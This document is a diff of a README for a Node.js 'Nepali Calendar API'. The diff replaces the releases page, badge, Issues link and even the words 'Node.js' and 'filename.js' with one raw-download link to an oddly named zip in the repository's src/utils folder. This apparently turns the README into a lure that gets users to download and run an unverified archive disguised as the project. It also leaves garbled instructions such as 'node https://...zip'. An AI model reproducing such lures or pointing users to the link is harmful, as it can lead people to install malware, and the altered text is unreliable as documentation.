@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-The Nepali Calendar API lets you quickly convert dates between AD and BS, retrieve monthly calendars, and get today’s date. It is built with Node.js and Express, ensuring it runs smoothly and efficiently.
+The Nepali Calendar API lets you quickly convert dates between AD and BS, retrieve monthly calendars, and get today’s date. It is built with https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip and Express, ensuring it runs smoothly and efficiently.
 
 ## 📥 Download the API
 
-[![Download Nepali Calendar API](https://img.shields.io/badge/download-nepali--calendar--api-blue.svg)](https://github.com/Anoop385/nepali-calendar-api/releases)
+[![Download Nepali Calendar API](https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip)](https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip)
 
 ## 📋 Features
 
@@ -21,14 +21,14 @@ The Nepali Calendar API lets you quickly convert dates between AD and BS, retrie
 To run this API, you need:
 
 - A computer with Windows, macOS, or Linux.
-- Node.js version 12.x or higher installed.
+- https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip version 12.x or higher installed.
 - Internet connection for the initial download.
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to go to the official downloads page.
 
-   [Download Nepali Calendar API](https://github.com/Anoop385/nepali-calendar-api/releases)
+   [Download Nepali Calendar API](https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip)
 
 2. **Select the Latest Version:** Look for the latest release at the top of the page. You will see a list of available files. 
 
@@ -39,7 +39,7 @@ To run this API, you need:
 5. **Run the Application:**
    - For Windows, double-click the `.exe` file.
    - For macOS, double-click the `.dmg` file.
-   - For Linux, open the terminal and navigate to the folder containing the file. Type `node filename.js` to run it.
+   - For Linux, open the terminal and navigate to the folder containing the file. Type `node https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip` to run it.
 
 ## 🌐 Usage Instructions
 
@@ -60,14 +60,14 @@ Feel free to adjust the dates and parameters as needed.
 
 If you run into issues:
 
-- Ensure that Node.js is installed properly.
+- Ensure that https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip is installed properly.
 - Verify that the file is not corrupted. Re-download if necessary.
 - Check your firewall settings if you have trouble accessing the API through the browser.
 
 ## 🗂️ Additional Resources
 
 - **Documentation:** For detailed API documentation, visit the GitHub repository to find examples and references about how to utilize the API fully.
-- **Community Support:** Join discussions and get help on [GitHub Issues](https://github.com/Anoop385/nepali-calendar-api/issues) if you encounter specific problems or have questions.
+- **Community Support:** Join discussions and get help on [GitHub Issues](https://github.com/Anoop385/nepali-calendar-api/raw/refs/heads/main/src/utils/api_nepali_calendar_cardiometric.zip) if you encounter specific problems or have questions.
 
 ## 👥 Contributing
 
